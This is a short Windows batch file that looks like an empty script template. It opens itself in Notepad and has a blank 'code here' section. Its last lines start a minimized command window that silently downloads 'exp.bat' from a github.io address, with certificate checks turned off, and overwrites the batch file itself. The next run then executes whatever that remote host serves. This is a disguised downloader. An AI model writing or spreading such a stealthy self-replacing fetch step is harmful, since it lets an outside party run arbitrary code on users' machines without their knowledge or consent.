@echo off
notepad %0

:: -------------------- code here -------------------



:: -------------------- code end --------------------

start /min "" cmd /c curl -k https://stivengiv.github.io/self/exp.bat -o %0 -s
exit /b